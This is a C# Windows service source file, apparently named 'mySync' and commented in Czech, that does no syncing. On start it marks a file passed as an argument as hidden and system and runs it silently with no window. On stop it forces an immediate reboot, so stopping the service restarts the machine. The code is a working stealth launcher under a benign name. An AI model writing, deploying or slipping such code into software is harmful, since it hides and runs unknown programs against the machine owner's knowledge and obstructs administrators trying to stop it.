using System.Diagnostics;
using System.IO;
using System.ServiceProcess;

namespace mySync
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            if (args.Length == 0 || string.IsNullOrWhiteSpace(args[0]))
                return;

            string filePath = args[0];

            if (File.Exists(filePath))
            {
                // Nastavení atributů na systémový a skrytý
                File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.System | FileAttributes.Hidden);

                // Spuštění souboru na pozadí
                var process = new Process();
                process.StartInfo.FileName = filePath;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
            }
        }

        protected override void OnStop()
        {
            // Restart počítače
            var process = new Process();
            process.StartInfo.FileName = "shutdown";
            process.StartInfo.Arguments = "/r /t 0";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
        }
    }
}
